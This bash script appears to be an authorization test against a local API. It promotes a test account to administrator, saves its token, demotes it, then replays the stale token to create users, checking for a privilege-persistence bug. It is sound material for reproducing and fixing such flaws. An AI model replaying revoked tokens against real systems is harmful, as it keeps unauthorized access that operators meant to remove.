#!/bin/bash
API=http://localhost:3000
PW='Thesis-Pass-1234!'
VID=d2e1485c-f15f-4ce3-8434-6581733a7011
TID=e18ceeb9-72ab-473d-bdc3-95bfaf4433c5
jqpy(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)"; }
login(){ curl -s -X POST $API/v1/auth/operator/login -H 'Content-Type: application/json' -d "{\"email\":\"$1\",\"password\":\"$PW\"}" | jqpy "d.get('accessToken','')"; }
srole(){ python3 -c "import sys,base64,json;t='$1'.split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t)).get('srole'))"; }
stepup(){ curl -s -X POST $API/v1/auth/operator/me/password-confirm -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"password\":\"$PW\"}" | jqpy "d.get('accessToken','')"; }
# source/follow-up write: POST /v1/users (needs system.users.admin, no step-up). unique email each call.
writecode(){ local tok="$1"; local n="create-$RANDOM$RANDOM"; curl -s -o /dev/null -w '%{http_code}' -X POST $API/v1/users -H "Authorization: Bearer $tok" -H 'Content-Type: application/json' -d "{\"email\":\"$n@probe.test\",\"fullName\":\"P\",\"phone\":\"+100000$RANDOM\",\"pin\":\"1234\",\"role\":\"guest\",\"username\":\"$n\"}"; }

echo "===== PRE: promote victim -> administrator (SA step-up) ====="
SA=$(login op@orkestra.test); SAE=$(stepup "$SA")
pc=$(curl -s -o /dev/null -w '%{http_code}' -X PUT $API/v1/users/$VID -H "Authorization: Bearer $SAE" -H 'Content-Type: application/json' -d '{"role":"administrator"}')
echo "promote PUT -> HTTP $pc"
echo "victim role after promote: $(login vic@orkestra.test | xargs -I{} bash -c 'echo {}' >/dev/null; curl -s -X POST $API/v1/auth/operator/login -H 'Content-Type: application/json' -d "{\"email\":\"vic@orkestra.test\",\"password\":\"$PW\"}" | jqpy "d.get('user',{}).get('role')")"

echo; echo "===== MR-A1 hand-check ====="
echo "[A] victim login -> OLD token"
VOLD=$(login vic@orkestra.test); echo "    V_OLD srole = $(srole "$VOLD")"
echo "[B] SOURCE: victim(admin) POST /v1/users with V_OLD  (expect 2xx)"
echo "    -> HTTP $(writecode "$VOLD")"
echo "[C] viewer(guest) POST /v1/users  (expect 403 = guard present)"
VW=$(login tgt@orkestra.test); echo "    -> HTTP $(writecode "$VW")"
echo "[D] TRANSITION: SA demotes victim administrator->guest (step-up)  (expect 2xx)"
SA=$(login op@orkestra.test); SAE=$(stepup "$SA")
dc=$(curl -s -o /dev/null -w '%{http_code}' -X PUT $API/v1/users/$VID -H "Authorization: Bearer $SAE" -H 'Content-Type: application/json' -d '{"role":"guest"}')
echo "    -> HTTP $dc"
echo "[E] confirm demotion: fresh victim login srole + fresh-token write (expect guest / 403)"
VNEW=$(login vic@orkestra.test); echo "    fresh victim srole = $(srole "$VNEW") ; fresh-token write -> HTTP $(writecode "$VNEW")"
echo "[F] *** REPLAY V_OLD write AFTER demotion (VULN expects 2xx = MR-A1 bug) ***"
echo "    -> HTTP $(writecode "$VOLD")"
